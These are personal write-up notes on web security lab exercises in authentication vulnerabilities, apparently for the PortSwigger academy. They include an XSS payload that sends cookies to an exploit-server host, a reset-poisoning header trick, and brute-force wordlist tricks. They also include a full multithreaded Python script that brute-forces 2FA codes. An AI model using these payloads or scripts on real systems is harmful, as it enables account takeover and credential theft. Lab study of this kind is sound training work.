# AUTHENTICATION VULNERABILITIES

---

<img width="1057" height="258" alt="image" src="https://github.com/user-attachments/assets/e61107a1-529a-4e90-8595-181414b6ed84" />


<img width="1038" height="312" alt="image" src="https://github.com/user-attachments/assets/d16cfa80-59c1-498e-b2c7-c4c44fda17e3" />


<img width="1029" height="299" alt="image" src="https://github.com/user-attachments/assets/99bfb7ad-75dd-4aab-a64e-555bb4fb3f47" />


//Lab: Brute-forcing a stay-logged-in cookie

- log in as wiener:peter with stay logged in box checked
- notice we'd get the stay-logged-in cookie
- notice it looks base64 encoded -- use decoder and found that it's `wiener:<hash>`
- the hash looks like md5 -- try and crack it on crackstation and yes it's md5 `peter`
- so: `base64(<user> : <md5hash>)`
- on burp send /login request to intruder
- change id to carlos -- set password as target param --  paste payload list
- set payload processing accordingly and sequentially -- 1. hash md5 -- 2. add prefix carlos: -- 3. base64 encode
- then we get 200 OK on the successful login attempt

---

<img width="1081" height="172" alt="image" src="https://github.com/user-attachments/assets/ca22ae63-b8b8-4984-ba17-7d2068f7b138" />


//Lab: Offline password cracking


- try XSS on the comment form
- try this payload with the url of our exploit server

```
<script>document.location='https://exploit-0a1b008404dfb351808e029001800001.exploit-server.net/'+document.cookie</script>
```

- and got a hit on our exploit server log
  
<img width="1536" height="432" alt="image" src="https://github.com/user-attachments/assets/ca8052f0-4816-4e96-834d-bfd78f030b96" />

- use burp decoder

<img width="684" height="277" alt="image" src="https://github.com/user-attachments/assets/3bccf8a5-9fed-48f3-8c56-eabbf618606e" />

- then crack the hash on crackstation.net

<img width="966" height="279" alt="image" src="https://github.com/user-attachments/assets/24eab12c-7011-4880-a123-84bef77c08bb" />

- then login with `carlos : onceuponatime`
- and delete account

---


<img width="1010" height="256" alt="image" src="https://github.com/user-attachments/assets/c93694ba-76f5-4423-969f-773c5fed44c3" />


<img width="1086" height="300" alt="image" src="https://github.com/user-attachments/assets/d34ce0eb-1821-410a-9f37-0d937786b0cd" />


<img width="1071" height="278" alt="image" src="https://github.com/user-attachments/assets/e04560b2-576e-41a8-82b8-897ecb64e240" />


<img width="1115" height="346" alt="image" src="https://github.com/user-attachments/assets/7d296399-890f-4cdc-b0f0-8855ca78b7c7" />


//Lab -- password reset broken logic

- check our email for our exploit server

`wiener@exploit-0a43002f034e9138805dc09f01e60087.exploit-server.net`

- now click on `forget password` and type in our email
- in our email client we get an email with a link to reset password
- try and reset our password
- it redirects
- try and log in with our new password and it works

<img width="928" height="417" alt="image" src="https://github.com/user-attachments/assets/668efed3-84c4-400b-8804-4cfc56779a18" />


- now from the earlier POST request `/forgot-password?temp-forgot-password-token=30lrllg39e1avwc5wgds6dylu45q5j7ua`
- swap in our new password and username carlos
- it redirects
<img width="989" height="431" alt="image" src="https://github.com/user-attachments/assets/d26d56a4-d265-4975-8b06-521a1c76f196" />


- log in with `carlos : tools`
- and lab solved

<img width="1180" height="662" alt="image" src="https://github.com/user-attachments/assets/a5f40130-300d-43bd-9b6a-4ca6d3746ede" />


---

<img width="1010" height="151" alt="image" src="https://github.com/user-attachments/assets/db43c8e8-f08a-47b0-8ccb-91c9cb618778" />



//Lab -- password reset poisoning via middleware


- log in with `wiener : peter`
- check our email for our exploit server -- `wiener@exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net`
- log out and click on the `forgot password` endpoint
- try and reset our password -- got a link in our email -- click on the link -- confirmed that we can successfully reset our password
- now on repeater -- try and add `X-Forwarded-Host: https://exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net` to the request header of `/forgot-password` endpoint
- also use `carlos` as value in the username param

<img width="1248" height="406" alt="image" src="https://github.com/user-attachments/assets/b8e6c0b9-f553-4404-93d9-f2b250448b1c" />


- check our log in the exploit server and find the password reset token for carlos

<img width="1286" height="93" alt="image" src="https://github.com/user-attachments/assets/cc317e0e-01e2-4b0e-b5ec-de335822dce6" />

- now send the `/forgot-password?temp-forgot-password-token=<token>` endpoint where we actually reset password to repeater
- swap in the stolen token we got just now for carlos both in the request body and the actual query string up top
- also change the password param to our newly chosen password `tools` -- send it

<img width="1247" height="436" alt="image" src="https://github.com/user-attachments/assets/a34921d5-feb4-4e5c-ba01-ada105d1245a" />

- now try and log in with our new creds `carlos : tools`
- and lab solved

<img width="1211" height="665" alt="image" src="https://github.com/user-attachments/assets/ffa6e346-373c-438f-9653-8405982bcc3f" />

** LESSON LEARNED
- always try the `x-forwarded-host` header!

---

<img width="1042" height="282" alt="image" src="https://github.com/user-attachments/assets/1accfa8a-cacd-4315-a052-7a36e6624659" />


//Lab: Password brute-force via password change

- log in with `wiener : peter`
- try and change new password
- in repeater, experiment around and observe that invalid creds would cause 'current password is incorrect error'
- however, if we use valid creds but with 2 different new passwords -- we get 'new passwords do not match' error
- which we can use to identify carlos' password

<img width="1251" height="411" alt="image" src="https://github.com/user-attachments/assets/4e82edf4-e20b-4610-aaec-5590472cc5f3" />

- send request to intruder
- set pitchfork attack
- set up 2 payloads
- NOTE that we need for every third request to be correct credentials to prevent rate limiting and potential IP ban
- first payload for username param
- to create username-wordlist `python3 -c "for _ in range(50): print('carlos\ncarlos\nwiener')"`

<img width="450" height="457" alt="image" src="https://github.com/user-attachments/assets/47f29eaa-ed92-427a-bc85-75767413062a" />

- second payload for current-password param
- to create password-wordlist
```
with open("wordlist.txt") as f:
    words = [line.strip() for line in f]

interleaved = []
for i, word in enumerate(words):
    interleaved.append(word)
    if (i + 1) % 2 == 0:  # After every 2 candidate passwords, insert valid password
        interleaved.append("peter")

with open("interleaved_passwords.txt", "w") as f:
    f.write("\n".join(interleaved))

```

<img width="449" height="451" alt="image" src="https://github.com/user-attachments/assets/d3032413-6d7d-46f3-b572-58d94e63b07b" />


- now make sure that the two new passwords params have different values -- to trigger `new passwords do not match` error

<img width="1552" height="443" alt="image" src="https://github.com/user-attachments/assets/c0cff5f7-0607-4097-8403-cd6dd8ad2f1a" />


- start the attack and after a few seconds, we found a potential match `carlos : master`

<img width="1173" height="770" alt="image" src="https://github.com/user-attachments/assets/73fb3731-cc31-410a-a13f-178f62252ceb" />


- log in as `carlos : master`
- lab solved

<img width="1050" height="446" alt="image" src="https://github.com/user-attachments/assets/134c81e9-4cb3-47c5-a883-6425a5712081" />


---

<img width="1038" height="132" alt="image" src="https://github.com/user-attachments/assets/690c29f5-1fcf-44f5-856f-53e519fe53b1" />


<img width="1020" height="237" alt="image" src="https://github.com/user-attachments/assets/2f914435-876c-4130-ae90-e3493dfb2c6e" />


<img width="1023" height="285" alt="image" src="https://github.com/user-attachments/assets/e0ddbf3a-660c-46cc-b238-ed847cabbdbd" />


<img width="1016" height="258" alt="image" src="https://github.com/user-attachments/assets/a559aa78-3040-4b02-bfd0-5b6413a8b16a" />


<img width="1006" height="294" alt="image" src="https://github.com/user-attachments/assets/865e74a0-2040-45b1-9b12-998ddac24375" />


<img width="1030" height="176" alt="image" src="https://github.com/user-attachments/assets/2f4d075f-3a7d-4d77-b7ce-23ef44e80480" />


<img width="1027" height="161" alt="image" src="https://github.com/user-attachments/assets/32a2e310-0f2a-43e0-b98d-fc35225d1f35" />


<img width="1032" height="351" alt="image" src="https://github.com/user-attachments/assets/c76b386a-fc93-45e3-b2e5-9585ebd28c20" />



---

//Lab: Broken brute-force protection, multiple credentials per request

- try logging in with `wiener : peter` at `/login`
- it works

<img width="1169" height="387" alt="image" src="https://github.com/user-attachments/assets/22db6029-087f-4787-bfed-63ce048588d3" />

- first try and place valid creds `wiener : peter` in every third request -- but we still get blocked right away after a successful attempt
- since the request body is in JSON format -- we can try stuffing the entire wordlist inside a list `[]`
- notice that the response appears to be user carlos account page with a potentially valid session cookie

<img width="1246" height="474" alt="image" src="https://github.com/user-attachments/assets/653b331c-9f7e-47ab-8117-022e3e8edf39" />

- now either right click and select `open response in browser` -- then copy and paste the url onto the browser -- then we get carlos account page -- and lab solved
- OR we could try pasting the session cookie of carlos `6DY12drlGzwbjcWBVea9Wrr6DxWeSrsy` on our browser cookie storage -- and refresh


---


//Lab -- 2FA bypass using a brute-force attack

- log in with `carlos : montoya`
- need to brute force `/login2` for the 4 digit code
- could use burp intruder + macro -- but would take a long time with burp community


#### burp macro

- for burp macro: Settings --> sessions
- 'Add' a macro

<img width="1003" height="663" alt="image" src="https://github.com/user-attachments/assets/6b0fc2ac-8103-474b-9785-2c3a7988cdf3" />


- name the macro 'login as carlos'
- 'configure item' and choose the GET and POST requests for /login -- as well as GET request for /login2
- this is all because we need the macro to log us back in every time we get logged out due to every 2 wrong code attempts
- then 'test the macro' -- to make sure the login is successful

<img width="1267" height="666" alt="image" src="https://github.com/user-attachments/assets/80eccb6e-f56f-454f-9e75-8d804cf91590" />

- then add 'session handling rules'
- add description 'run macro'
- add rule action to run macro 'login as carlos'

<img width="1169" height="686" alt="image" src="https://github.com/user-attachments/assets/6e991dc8-d9f4-459d-a3f8-7c683a78dd2f" />


- then set the scope to 'include all urls'
- also make sure `intruder` and `repeater` are both selected in tools scope

<img width="1127" height="679" alt="image" src="https://github.com/user-attachments/assets/d6f9c88f-f9ca-49f5-9609-5ce4b8e549ed" />


- now set sniper attack
- payload to be numbers from 0000-9999
- max integer digits 4
- max concurrent requests 1 in resource pool

<img width="1265" height="662" alt="image" src="https://github.com/user-attachments/assets/1e279167-5b92-4764-b418-d4c9a4932104" />

- whenever we got a 302 code -- it signifies a valid code
- however this takes too long


#### CUSTOM PYTHON SCRIPT

- could use a python script -- with multithreading


```

import requests
from bs4 import BeautifulSoup
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net"
LOGIN_URL = f"https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net/login"
MFA_URL = f"https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net/login2"

USERNAME = "carlos"
PASSWORD = "montoya"

MAX_THREADS = 15

# Optional: Route through Burp (127.0.0.1:8080) so you can inspect traffic visually
PROXIES = None 
# PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

FOUND_RESULT = None

def get_mfa_csrf(session):
    """Logs in as carlos and returns initial MFA CSRF token."""
    res = session.get(LOGIN_URL, proxies=PROXIES, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]

    login_data = {
        "csrf": csrf_token,
        "username": USERNAME,
        "password": PASSWORD
    }
    session.post(LOGIN_URL, data=login_data, proxies=PROXIES, verify=False)

    res_mfa = session.get(MFA_URL, proxies=PROXIES, verify=False)
    mfa_soup = BeautifulSoup(res_mfa.text, "html.parser")
    return mfa_soup.find("input", {"name": "csrf"})["value"]

def test_code_chunk(codes):
    """Worker task using an isolated requests.Session()."""
    global FOUND_RESULT
    
    session = requests.Session()
    
    try:
        mfa_csrf = get_mfa_csrf(session)
    except Exception:
        return None

    failed_attempts = 0

    for code in codes:
        if FOUND_RESULT:
            return None

        mfa_code = f"{code:04d}"
        mfa_payload = {"csrf": mfa_csrf, "mfa-code": mfa_code}

        try:
            res = session.post(
                MFA_URL, 
                data=mfa_payload, 
                allow_redirects=False, 
                proxies=PROXIES, 
                verify=False
            )
            failed_attempts += 1

            # Check for successful MFA bypass (302 Redirect to /my-account)
            if res.status_code == 302 and "/my-account" in res.headers.get("Location", ""):
                
                # Extract session cookies from the response and session jar
                cookies_dict = session.cookies.get_dict()
                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
                
                FOUND_RESULT = {
                    "code": mfa_code,
                    "cookies": cookie_str,
                    "location": res.headers.get("Location")
                }
                
                print("\n\n" + "="*50)
                print(f"[!] SUCCESS! MFA Code: {mfa_code}")
                print(f"[!] Redirect Location: {res.headers.get('Location')}")
                print(f"[!] Authenticated Session Cookie:\n    {cookie_str}")
                print("="*50 + "\n")
                
                return FOUND_RESULT

            # Re-authenticate every 2 attempts or on redirect back to /login
            if failed_attempts >= 2 or (res.status_code == 302 and "/login" in res.headers.get("Location", "")):
                mfa_csrf = get_mfa_csrf(session)
                failed_attempts = 0
            else:
                res_mfa = session.get(MFA_URL, proxies=PROXIES, verify=False)
                mfa_soup = BeautifulSoup(res_mfa.text, "html.parser")
                mfa_csrf = mfa_soup.find("input", {"name": "csrf"})["value"]

        except Exception:
            try:
                mfa_csrf = get_mfa_csrf(session)
                failed_attempts = 0
            except Exception:
                pass

    return None

def main():
    print(f"[+] Starting Multithreaded MFA Brute Force ({MAX_THREADS} threads)...")
    
    all_codes = list(range(0, 10000))
    chunk_size = 20
    chunks = [all_codes[i:i + chunk_size] for i in range(0, len(all_codes), chunk_size)]

    tested_count = 0

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(test_code_chunk, chunk): chunk for chunk in chunks}

        for future in as_completed(futures):
            if FOUND_RESULT:
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            tested_count += len(futures[future])
            print(f"[*] Tested ~{tested_count}/10000 codes...", end="\r")

if __name__ == "__main__":
    main()

```

- once we got the cookie for the successful session -- we paste it in the browser
- and navigate to `/my-account`

<img width="581" height="185" alt="image" src="https://github.com/user-attachments/assets/85fb4553-f3f5-4e62-a784-b4389f3777c1" />


- and lab solved finally

<img width="1159" height="798" alt="image" src="https://github.com/user-attachments/assets/e06ae69e-c222-4a7f-9f0f-1185b78823e8" />
















